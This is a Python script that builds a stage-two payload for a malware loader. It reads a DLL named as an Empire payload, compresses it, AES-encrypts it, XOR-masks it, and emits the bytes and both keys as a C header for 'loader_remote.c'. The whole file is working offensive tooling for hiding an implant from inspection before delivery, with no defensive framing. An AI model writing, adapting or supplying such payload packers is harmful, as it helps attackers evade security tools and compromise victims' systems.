import pefile, base64, os, struct
from Crypto.Cipher import AES
import zlib
import random

EMBED_PATH = "empire_payload.dll"
OUT_H = "./includes/loader_remote.h"
KEY = os.urandom(16)
XOR_KEY = random.randint(1, 255)

print("[*] Using AES key:", KEY.hex())
print("[*] XOR key:", hex(XOR_KEY))

def xor(data, key):
    return bytes(b ^ key for b in data)

def compress_zlib(data):
    return zlib.compress(data)  
def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len]) * pad_len
    return cipher.encrypt(data)

with open(EMBED_PATH, 'rb') as f:
    stage2 = f.read()

compressed = compress_zlib(stage2)
encrypted = aes_encrypt(compressed, KEY)
xored = xor(encrypted, XOR_KEY)

print(f"[*] Original: {len(stage2)} bytes → Compressed: {len(compressed)} → Encrypted+XOR: {len(xored)}")

with open(OUT_H, 'w') as f:
    f.write("#pragma once\n\n")
    f.write("unsigned char stage2[] = {\n")
    for i in range(0, len(xored), 16):
        chunk = ', '.join(f"0x{b:02x}" for b in xored[i:i+16])
        f.write(f"  {chunk},\n")
    f.write("};\n\n")
    f.write(f"unsigned int stage2_len = {len(xored)};\n")
    f.write(f"unsigned char xor_key = 0x{XOR_KEY:02x};\n")
    f.write(f"unsigned char aes_key[] = {{ {', '.join(f'0x{b:02x}' for b in KEY)} }};\n")

print("[✓] loader_remote.h generated for loader_remote.c")

